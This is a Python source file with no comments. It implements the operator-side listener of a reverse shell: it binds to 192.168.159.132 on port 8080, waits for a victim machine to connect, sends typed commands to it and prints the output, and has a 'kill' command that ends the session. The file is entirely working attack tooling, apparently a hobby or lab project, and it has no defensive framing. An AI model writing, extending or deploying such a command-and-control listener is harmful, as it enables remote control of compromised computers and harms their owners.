import socket

def main():
    reciever = Reciever('192.168.159.132', 8080)
    reciever.start()

class Reciever:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        try:
            self.connect()
            self.shell()
        except KeyboardInterrupt:
            try:
                self.conn.send('kill'.encode())
                self.conn.close()
                self.sock.close()
                exit()
            except Exception:
                exit()

    def connect(self):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.ip, self.port))
        self.sock.listen(1)
        self.conn, self.addr = self.sock.accept()
        return print(f'[+] Connection recieved from {self.addr}')

    def shell(self):
        while True:
            command = input('>> ')
            if 'kill' in command:
                self.conn.send('kill'.encode())
                self.conn.close()
                return
            if command.strip() == '':
                print('No command given...')
                continue
            self.conn.send(command.encode())
            print(self.conn.recv(1024).decode())


if __name__ == '__main__':
    main()